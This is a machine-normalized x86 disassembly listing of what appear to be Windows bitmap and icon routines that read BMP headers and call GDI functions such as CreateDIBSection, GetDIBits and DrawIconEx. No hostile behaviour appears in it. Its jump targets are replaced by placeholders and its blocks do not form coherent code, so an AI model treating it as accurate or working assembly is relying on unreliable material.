mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_404c14
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
movzx eax [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_433ebc
mov eax [ ebx + 0x20 ]
movzx edx [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
movzx eax [ ebx + 0xe ]
call sub_44e460
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_44e480
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_433ebc
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
push 0x0
call GetDC
call sub_44e2f0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_451f35
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_44e72c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_404204
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_451e9d
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_433ebc
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_451e71
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_44e9e8
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_4184b8
call sub_44e1dc
jmp r-xdata
xor eax eax
push ebp
push sub_451f04
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_433ebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451e78
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451f3c
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_4184b8
call sub_44e1dc
jmp r-xdata
sub_451e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_404220
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_451f3c
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_404c14
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectW
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_451fd1
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_44e9e8
mov [ ebp - 0x30 ] eax
sub_451fee
lea eax [ ebp - 0x9c ]
push eax
movzx eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_45199c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x39 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4512e4
sub_452054
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_451568
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_433ebc
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_404c14
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_45199c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_451ac4
call sub_44e1dc
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4520c4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_451568
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_404c14
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectW
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_4505b4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_45215f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_45199c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_452188
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4511c4
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_451568
mov eax esi
call sub_45175c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_451568
mov eax esi
call sub_45175c
mov eax esi
call sub_4514f4
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_4505b4
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4509e8
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
movzx edx [ edi + 0x71 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_45199c
jmp r-xdata
push esp
movzx edx [ edi + 0x71 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_45199c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_44ff50
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4522e8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_451578
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
movzx eax bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4509e8
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_452364
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_451568
mov eax ebx
call sub_451578
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_44ff50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4523fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
movzx eax [ esi + 0x71 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45199c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_44fe48
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_44ab78
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_452401
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_406120
call sub_406174
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_44fe48
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452438
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_451244
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_44e1c4
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_404c14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
movzx edx bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_452584
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4509e8
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_44e2f0
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_4525a0
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_451578
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4509e8
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_4525f0
push ebx
mov ebx eax
cmp dl [ ebx + 0x38 ]
je r-xdata
pop ebx
retn
test dl dl
jne r-xdata
mov eax ebx
call sub_4514a4
mov edx eax
mov eax ebx
call sub_4525a0
mov edx 0x20000000
mov eax ebx
call sub_4525a0
jmp r-xdata
sub_452634
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_404c14
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4514f4
mov eax [ esi + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
cmp [ esi + 0x39 ] 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_433ef4
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_44f128
cmp [ ebp + 0x71 ] 0x0
je r-xdata
mov eax esi
call sub_451388
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_433ef4
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_404c14
mov [ esp + 0x10 ] 0x4d42
cmp [ ebp + 0x3e ] 0x8
ja r-xdata
mov [ esp + 0x8 ] 0xc
movzx eax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
lea eax [ ebp + 0x18 ]
call sub_44ff04
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
mov eax esi
call sub_451144
movzx edx [ r-xdata ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x38 ]
push eax
call SelectObject
call sub_44e2f0
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x38 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x38 ]
push eax
call SelectObject
jmp r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x71 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_433ef4
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_433ef4
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
movzx edx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
movzx edx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
movzx eax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_433ef4
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_433ef4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
movzx eax [ ebp + 0x71 ]
movzx ecx [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_433ef4
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_433ef4
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_44e768
cmp [ ebp + 0x71 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_433ef4
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_44ea8c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
add eax eax
add eax eax
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_452958
push ebx
mov ebx eax
mov eax ebx
call sub_451578
mov edx ebx
mov eax ebx
call sub_450aa8
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_452984
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_451578
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x5c ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x44 ] eax
xor eax eax
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_44ff50
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4529fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_4505b4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_452a24
push ebx
push esi
push edi
add esp 0xffffffac
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_451578
mov eax [ ebx + 0x28 ]
cmp esi [ eax + 0x1c ]
jne r-xdata
push esi
push edi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4509e8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp edi [ eax + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_452a8c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fd50
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_452ad4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
inc ebx
dec ebx
jne r-xdata
inc edx
mov edx [ ebp - 0x4 ]
dec edx
test edx edx
jl r-xdata
add eax 0x4
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
test [ eax + 0x3 ] 0xff
je r-xdata
sub_452b0c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43139c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx eax
mov eax [ ebp - 0xc ]
pop ecx
mov esi [ eax ]
call [ esi + 0x6c ]
mov dl 0x7
mov eax [ ebp - 0xc ]
call sub_452438
mov dl 0x1
mov eax [ ebp - 0xc ]
call sub_451448
mov eax [ ebp - 0xc ]
call sub_451144
mov eax [ eax + 0x48 ]
xor edx edx
call sub_44cd1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
xor edx edx
xor eax eax
call sub_40ab90
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0xc ]
call sub_451144
pop edx
mov ecx [ eax ]
call [ ecx + 0x4c ]
push 0x3
push 0x0
push 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
push eax
mov eax ebx
call sub_452f10
push eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_451144
call sub_44df24
push eax
call DrawIconEx
mov [ ebp - 0x50 ] 0x2c
mov [ ebp - 0x44 ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
mov [ ebp - 0x48 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x42 ] 0x20
mov eax [ ebp - 0x4c ]
add eax eax
add eax eax
imul [ ebp - 0x48 ]
call sub_4041ec
mov [ ebp - 0x4 ] eax
xor esi esi
push ebp
push sub_452dbd
push [ fs : esi ]
mov [ fs : esi ] esp
push 0x0
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x70 ]
push eax
mov eax [ ebp - 0xc ]
call sub_451144
call sub_44df24
push eax
call GetDIBits
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp esi eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_404220
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_452ad4
test al al
jne r-xdata
mov eax [ ebp - 0x4c ]
add eax eax
add eax eax
imul [ ebp - 0x48 ]
call sub_4041ec
mov [ ebp - 0x8 ] eax
xor esi esi
push ebp
push sub_452da0
push [ fs : esi ]
mov [ fs : esi ] esp
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
call sub_452f10
push eax
call GetIconInfo
xor esi esi
push ebp
push sub_452d83
push [ fs : esi ]
mov [ fs : esi ] esp
push 0x0
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
call sub_451144
call sub_44df24
push eax
call GetDIBits
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp esi eax
jne r-xdata
xor eax eax
